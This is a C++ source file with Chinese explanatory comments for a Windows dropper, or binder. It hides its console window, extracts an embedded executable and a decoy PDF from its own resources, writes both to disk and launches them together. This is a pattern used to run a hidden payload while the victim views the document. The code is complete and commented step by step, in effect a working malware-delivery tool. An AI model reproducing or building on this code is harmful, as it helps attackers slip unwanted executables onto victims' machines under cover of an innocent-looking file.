#include <iostream>
#include <windows.h>
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

using namespace std;

//引入需要的头文件和命名空间，定义全局变量和字符串常量。
static int num = 0;
//在这里定义释放后的exe名称
static string EXE = "resources\\geek64.exe";
//在这里定义释放后的附件名称
static string Filename = "resources\\tabulary.pdf";
//在这里定义释放路径具体位置
CHAR czTempPath[MAX_PATH] = "C:\\Users\\Dao\\Projects\\Programming\\C++\\exe";

//定义 EnumTypesFunc() 函数，该函数用于处理枚举到的资源类型。
void EnumTypesFunc(HMODULE hModule, LPTSTR lpType, LPTSTR lParam) {
    string Name = "";
    CHAR PathFileName[MAX_PATH] = { 0 };
    CHAR FileName[MAX_PATH] = { 0 };

    //在 EnumTypesFunc() 函数中，首先获取资源类型，并将其转换为字符串类型。
    num++;
    char* a = new char[10];
    WideCharToMultiByte(CP_OEMCP, NULL, lpType, -1, a, 6, NULL, FALSE);
    string fileType = string(a);

    //首先，使用 FindResourceA() 函数在当前进程中查找指定资源类型和名称的资源，并返回该资源的句柄。
    HRSRC Resource = FindResourceA(NULL, MAKEINTRESOURCEA(100 + num), fileType.c_str());
    //然后，使用 LoadResource() 函数加载指定资源到内存，并返回该资源的全局内存句柄。
    HGLOBAL ResourceGlobal = LoadResource(NULL, Resource);
    //接着，使用 SizeofResource() 函数获取该资源的大小。
    DWORD FileSize = SizeofResource(NULL, Resource);
    //最后，使用 LockResource() 函数将资源数据锁定到内存中，并返回该资源数据的指针。
    LPVOID PFILE = LockResource(ResourceGlobal);

    //根据资源类型判断需要提取的文件名，并构造保存文件的完整路径。
    if (fileType == "EXE") {
        Name = EXE;
    }
    else {
        Name = Filename;
    }
    string FileNameFinal = czTempPath + Name;
    strcpy_s(FileName, FileNameFinal.c_str());

    //使用 CreateFileA() 函数创建一个新的文件，并将资源数据写入该文件中。
    HANDLE FILE = CreateFileA(FileName, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
    DWORD dwSize;
    WriteFile(FILE, PFILE, FileSize, &dwSize, NULL);
    CloseHandle(FILE);

    //使用 ShellExecuteExA() 函数启动刚才提取的文件
    Sleep(100);
    SHELLEXECUTEINFOA shellexecute = { 0 };
    shellexecute.cbSize = sizeof(shellexecute);
    shellexecute.lpFile = FileName;
    shellexecute.nShow = SW_SHOW;
    ShellExecuteExA(&shellexecute);
}


int main(int argc, char* argv[])
{
    //在 main() 函数中使用枚举函数 EnumResourceTypes() 枚举所有资源类型
    EnumResourceTypes(NULL, (ENUMRESTYPEPROC)EnumTypesFunc, 0);                             
}
